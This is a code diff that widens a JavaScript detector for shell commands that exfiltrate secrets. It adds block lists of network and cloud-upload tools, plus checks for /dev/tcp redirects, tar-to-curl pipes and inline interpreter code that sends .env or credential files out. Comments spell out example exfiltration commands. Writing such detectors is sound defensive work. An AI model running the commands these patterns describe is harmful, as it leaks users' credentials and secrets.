@@ -68,13 +68,17 @@ const BASH_SECRET_READ_PREFIXES = [
 ];
 
 // Tools that can carry secret material off-box.
-const OUTBOUND_FILE_COMMANDS = new Set(['curl', 'wget']);
+const OUTBOUND_FILE_COMMANDS = new Set(['curl', 'wget', 'http', 'https', 'httpie']);
 const NETWORK_EXFIL_COMMANDS = new Set([
   'curl', 'wget', 'nc', 'ncat', 'netcat', 'scp', 'rsync', 'sftp', 'ftp', 'lftp',
+  'http', 'https', 'httpie', 'rclone', 'aws', 'gsutil', 'az', 'gcloud',
 ]);
 const SECRET_FILE_READ_COMMANDS = new Set([
-  'cat', 'head', 'tail', 'less', 'more', 'base64', 'xxd', 'od', 'hexdump', 'gzip', 'bzip2', 'xz',
+  'cat', 'head', 'tail', 'less', 'more', 'base64', 'xxd', 'od', 'hexdump',
+  'gzip', 'bzip2', 'xz', 'dd', 'pv', 'tee', 'type', 'bat',
 ]);
+// Cloud / object-store verbs that upload local files off-box.
+const CLOUD_UPLOAD_VERBS = new Set(['cp', 'mv', 'sync', 'copy', 'copyto', 'move', 'upload']);
 const OUTBOUND_COMMAND_WRAPPERS = new Set(['command', 'env', 'nohup', 'sudo']);
 const SHELL_QUOTES = new Set(['"', "'"]);
 const SHELL_SEGMENT_SEPARATORS = new Set([';', '|', '&', '\n']);
@@ -696,11 +700,12 @@ function segmentSecretPathFindings(segment, cwd) {
 }
 
 function detectCommandSubstitutionExfil(command, cwd) {
-  // $(cat .env), $(base64 .env), `cat .env` — secret is not literal in argv of curl.
+  // $(cat .env), $(base64 .env), `cat .env`, <(cat .env) — secret not literal in curl argv.
   const findings = [];
   const patterns = [
     /\$\(\s*([a-z0-9._+-]+)\s+([^)]+)\)/gi,
     /`\s*([a-z0-9._+-]+)\s+([^`]+)`/gi,
+    /<\(\s*([a-z0-9._+-]+)\s+([^)]+)\)/gi,
   ];
   for (const pattern of patterns) {
     pattern.lastIndex = 0;
@@ -729,7 +734,8 @@ function detectCommandSubstitutionExfil(command, cwd) {
   if (findings.length === 0) return [];
   const hasNetwork = Boolean(segmentHasNetworkExfil(command))
     || /\|/.test(command)
-    || /https?:\/\//i.test(command);
+    || /https?:\/\//i.test(command)
+    || /\/dev\/tcp\//i.test(command);
   if (!hasNetwork) return [];
   return findings;
 }
@@ -797,15 +803,194 @@ function detectScpRsyncExfil(command, cwd) {
 
 function detectEnvVarNetworkExfil(command) {
   // echo $API_KEY | curl  OR  curl -d "$OPENAI_API_KEY" https://…
+  // printenv API_KEY | curl
+  const text = String(command || '');
   SECRET_ENV_VAR_PATTERN.lastIndex = 0;
-  if (!SECRET_ENV_VAR_PATTERN.test(command)) return [];
+  const hasEnvRef = SECRET_ENV_VAR_PATTERN.test(text)
+    || /\bprintenv\s+(?:API[_-]?KEY|OPENAI_API_KEY|ANTHROPIC_API_KEY|AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|GH_TOKEN|STRIPE_SECRET_KEY|NPM_TOKEN|ACCESS_TOKEN|CLIENT_SECRET)\b/i.test(text)
+    || /\benv\s+(?:API[_-]?KEY|OPENAI_API_KEY|ANTHROPIC_API_KEY|AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN)\b/i.test(text);
+  if (!hasEnvRef) return [];
   const networkVerb = segmentHasNetworkExfil(command);
-  if (!networkVerb && !/https?:\/\//i.test(command)) return [];
+  if (!networkVerb && !/https?:\/\//i.test(command) && !/\/dev\/tcp\//i.test(command)) {
+    return [];
+  }
   return [{
     id: 'secret_env_exfil',
     label: 'Secret environment variable',
     source: 'env_exfil',
     reason: `Secret-bearing environment variable used with network tool (${networkVerb || 'url'})`,
+  }];
+}
+
+function detectRedirectExfil(command, cwd) {
+  // curl … < .env   |   nc host port < ~/.aws/credentials   |   … > /dev/tcp/host/port
+  const findings = [];
+  const text = String(command || '');
+  const hasNetwork = Boolean(segmentHasNetworkExfil(text))
+    || /https?:\/\//i.test(text)
+    || /\/dev\/tcp\//i.test(text);
+  if (!hasNetwork) return findings;
+
+  // stdin redirect from a secret path
+  const redirectRe = /(?:^|[\s;|&])\d*\s*<\s*([^\s;|&><]+)/g;
+  let match = redirectRe.exec(text);
+  while (match) {
+    const pathFinding = classifySecretPathToken(match[1]);
+    if (pathFinding) {
+      findings.push({
+        ...pathFinding,
+        source: 'redirect_exfil',
+        reason: `${pathFinding.label} redirected into a network-bound command`,
+      });
+    }
+    match = redirectRe.exec(text);
+  }
+
+  // Bash /dev/tcp with secret path anywhere in the same command
+  if (/\/dev\/tcp\//i.test(text)) {
+    const tokens = tokenizeCommand(text.replace(/[<>]/g, ' '));
+    for (const token of tokens) {
+      const pathFinding = classifySecretPathToken(token);
+      if (!pathFinding) continue;
+      findings.push({
+        ...pathFinding,
+        source: 'dev_tcp_exfil',
+        reason: `${pathFinding.label} used with /dev/tcp network redirect`,
+      });
+    }
+  }
+
+  // dd if=.env | curl / nc
+  const ddMatch = /\bdd\b[\s\S]*?\bif=([^\s]+)/i.exec(text);
+  if (ddMatch) {
+    const pathFinding = classifySecretPathToken(ddMatch[1]);
+    if (pathFinding && (Boolean(segmentHasNetworkExfil(text)) || /\|/.test(text) || /\/dev\/tcp\//i.test(text))) {
+      findings.push({
+        ...pathFinding,
+        source: 'dd_exfil',
+        reason: `${pathFinding.label} read via dd if= toward network`,
+      });
+    }
+  }
+
+  return findings;
+}
+
+function detectCloudCliExfil(command, cwd) {
+  // aws s3 cp .env s3://bucket/  |  gsutil cp .env gs://  |  rclone copy .env remote:
+  // az storage blob upload --file .env
+  const findings = [];
+  const text = String(command || '');
+  const tokens = tokenizeCommand(text);
+  if (!tokens.length) return findings;
+
+  let index = 0;
+  while (isShellAssignment(tokens[index])) index += 1;
+  const root = path.basename(String(tokens[index] || '')).toLowerCase();
+
+  const isCloud = root === 'aws' || root === 'gsutil' || root === 'gcloud'
+    || root === 'az' || root === 'rclone';
+  if (!isCloud) return findings;
+
+  // Require an upload-ish subcommand somewhere in the argv.
+  const hasUploadVerb = tokens.some((t) => CLOUD_UPLOAD_VERBS.has(String(t).toLowerCase()))
+    || /\bblob\s+upload\b/i.test(text)
+    || /\bstorage\s+cp\b/i.test(text);
+  if (!hasUploadVerb) return findings;
+
+  // Remote destination markers
+  const hasRemote = tokens.some((t) => /^(?:s3|gs|gcs|az|azure|oss):\/\//i.test(t) || /^[A-Za-z0-9_-]+:/.test(t) && !t.startsWith('/') && t.includes(':'))
+    || /--account-name|--container|--bucket/i.test(text);
+  if (!hasRemote && root !== 'rclone') {
+    // Still flag if a secret path is an explicit --file argument for az upload
+  }
+
+  for (const token of tokens) {
+    if (String(token).startsWith('-') && !String(token).includes('=@') && !String(token).includes('/')) {
+      // --file=.env or --file .env handled via next token / equals form below
+    }
+    const stripped = String(token).replace(/^--?[A-Za-z0-9_-]+=/, '');
+    const pathFinding = classifySecretPathToken(stripped) || classifySecretPathToken(token);
+    if (!pathFinding) continue;
+    findings.push({
+      ...pathFinding,
+      source: 'cloud_cli_exfil',
+      reason: `${pathFinding.label} referenced by cloud upload CLI (${root})`,
+    });
+  }
+
+  // az storage blob upload --file .env
+  const fileFlag = /(?:--file|-f)\s+([^\s]+)/i.exec(text);
+  if (fileFlag) {
+    const pathFinding = classifySecretPathToken(fileFlag[1]);
+    if (pathFinding) {
+      findings.push({
+        ...pathFinding,
+        source: 'cloud_cli_exfil',
+        reason: `${pathFinding.label} passed to ${root} --file upload`,
+      });
+    }
+  }
+
+  return findings;
+}
+
+function detectArchivePipeExfil(command, cwd) {
+  // tar czf - .env | curl  |  zip - .env | nc  |  tar -c .ssh | …
+  const findings = [];
+  const text = String(command || '');
+  if (!/\|/.test(text) && !segmentHasNetworkExfil(text) && !/https?:\/\//i.test(text)) {
+    return findings;
+  }
+  const segments = text.split(/(?<![|])\|(?![|])/);
+  const left = segments[0] || text;
+  const archiveVerb = path.basename(String(tokenizeCommand(left)[0] || '')).toLowerCase();
+  if (!['tar', 'zip', 'gzip', 'pigz', '7z', 'rar'].includes(archiveVerb)) {
+    // Also: tar … without being first if wrappers — skip for now
+    if (!/\b(?:tar|zip)\b/i.test(left)) return findings;
+  }
+  const right = segments.slice(1).join('|') || text;
+  const networkVerb = segmentHasNetworkExfil(right) || segmentHasNetworkExfil(text);
+  if (!networkVerb && !/https?:\/\//i.test(text)) return findings;
+
+  for (const token of tokenizeCommand(left)) {
+    const pathFinding = classifySecretPathToken(token);
+    if (!pathFinding) continue;
+    findings.push({
+      ...pathFinding,
+      source: 'archive_exfil',
+      reason: `${pathFinding.label} archived/streamed toward network (${networkVerb || 'url'})`,
+    });
+  }
+  // bare `.ssh` / `.aws` directories in tar
+  if (/(?:^|\s)(?:\.ssh|\.aws|\.gnupg|\.kube)(?:\s|$)/.test(left)) {
+    findings.push({
+      id: 'secret_dir_archive',
+      label: 'Secret credential directory',
+      source: 'archive_exfil',
+      reason: 'Credential directory streamed toward network',
+    });
+  }
+  return findings;
+}
+
+function detectInterpreterExfil(command, cwd) {
+  // python -c '…open(".env")…requests…'  |  node -e '…readFileSync(".env")…fetch…'
+  const text = String(command || '');
+  const isInterpreter = /\b(?:python3?|node|nodejs|php|ruby|perl)\b/i.test(text)
+    && /(?:-c|-e|--eval)\b/i.test(text);
+  if (!isInterpreter) return [];
+
+  const touchesSecretPath = /\.env(?:\.[A-Za-z0-9_-]+)?|\.aws\/credentials|\.ssh\/id_|\.netrc|\.npmrc|application_default_credentials/i.test(text);
+  const touchesSecretEnv = /(?:API_KEY|OPENAI_API_KEY|AWS_SECRET|GITHUB_TOKEN|STRIPE_SECRET|os\.environ|process\.env)/i.test(text);
+  const touchesNetwork = /https?:\/\/|requests\.|urllib|fetch\(|http\.request|httpx\.|aiohttp|socket\.|urlopen/i.test(text);
+  if (!(touchesSecretPath || touchesSecretEnv) || !touchesNetwork) return [];
+
+  return [{
+    id: 'interpreter_exfil',
+    label: 'Interpreter secret exfiltration',
+    source: 'interpreter_exfil',
+    reason: 'Inline interpreter code appears to read secret material and perform network I/O',
   }];
 }
 
@@ -815,6 +1000,10 @@ function detectStructuralExfiltration(command, cwd) {
     ...detectPipelineExfil(command, cwd),
     ...detectScpRsyncExfil(command, cwd),
     ...detectEnvVarNetworkExfil(command),
+    ...detectRedirectExfil(command, cwd),
+    ...detectCloudCliExfil(command, cwd),
+    ...detectArchivePipeExfil(command, cwd),
+    ...detectInterpreterExfil(command, cwd),
   ]);
 }
 
